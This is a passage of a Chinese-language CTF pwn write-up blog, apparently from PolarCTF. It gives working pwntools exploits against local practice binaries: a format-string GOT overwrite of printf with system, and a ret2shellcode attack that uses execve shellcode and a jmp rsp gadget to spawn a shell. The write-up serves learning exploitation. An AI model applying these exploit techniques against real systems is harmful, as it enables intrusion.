-<h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./fmt_text&#x27;)</span><br><span class="line">elf = ELF(&#x27;fmt_text&#x27;)</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">system_plt = elf.plt[&#x27;system&#x27;]</span><br><span class="line">payload = fmtstr_payload(6,&#123;printf_got:system_plt&#125;) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="bllbl-shellcode-2"><a href="#bllbl-shellcode-2" class="headerlink" title="bllbl_shellcode_2"></a>bllbl_shellcode_2</h1><p>知识点：</p>
-<ul>
-<li>ret2shellcode</li>
-</ul>
-<h2 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec，64位，保护全关，既然NX保护是关的，意味着可以用ret2shellcode打。<br><img src="/./images/p9/image-25.png"></p>
-<p>IDA里面看到yichu函数发生溢出，并且直接把写入的地址给我们了。</p>
-<p><img src="/./images/p9/image-26.png"></p>
-<p>还给了我们<code>jsp rsp</code>指令</p>
-<p><img src="/./images/p9/image-29.png"></p>
-<p>那么思路就是将shellode写到栈上去，利用<code>jsp rsp</code>指令跳转到shellcode写入地址，执行shellcode即可。</p>
-<p>这里再讲一下偏移，下断点到read处，输入<code>aaaaaaaa</code>：</p>
-<p><img src="/./images/p9/image-24.png"></p>
-<p>看到他是从<code>rsi-3</code>的位置开始写入的，那么写入<code>13个字节 ( = 16 - 3)</code>就能覆盖到返回地址。</p>
-<h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;bllbl_shellcode_2&#x27;)</span><br><span class="line"></span><br><span class="line">jmp_rsp = 0x401380</span><br><span class="line">binsh_addr = 0x402047</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">buf_addr = int(io.recv(12),16)</span><br><span class="line">success(&#x27;buf_addr = &gt;&gt;&gt; 0x%x&#x27; % buf_addr)</span><br><span class="line"></span><br><span class="line">shellcode = asm(&quot;&quot;&quot;</span><br><span class="line">mov al,0x3b;</span><br><span class="line">mov esi,edi</span><br><span class="line">mov edi,0x402047</span><br><span class="line">mov edx,esi</span><br><span class="line">syscall</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">shellcode += p64(jmp_rsp)</span><br><span class="line">shellcode += asm(&quot;&quot;&quot;</span><br><span class="line">sub rsp,21;   # 13+8</span><br><span class="line">jmp rsp</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">gdb.attach(io, &#x27;b *0x401376&#x27;)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote>
-<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0LzI1MDJfOTEyNjkyMTYvYXJ0aWNsZS9kZXRhaWxzLzE0NjQ1MzU2NA==">https://blog.csdn.net/2502_91269216/article/details/146453564<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMW0zWG5ZNkVBNQ==">https://www.bilibili.com/video/BV1m3XnY6EA5<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>pwn学习</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>PolarCTF</tag>
-        <tag>koi</tag>
-        <tag>bllhl_mom</tag>
-        <tag>bllbl_shellcode_2</tag>
-        <tag>libc</tag>
       </tags>
   </entry>
 </search>
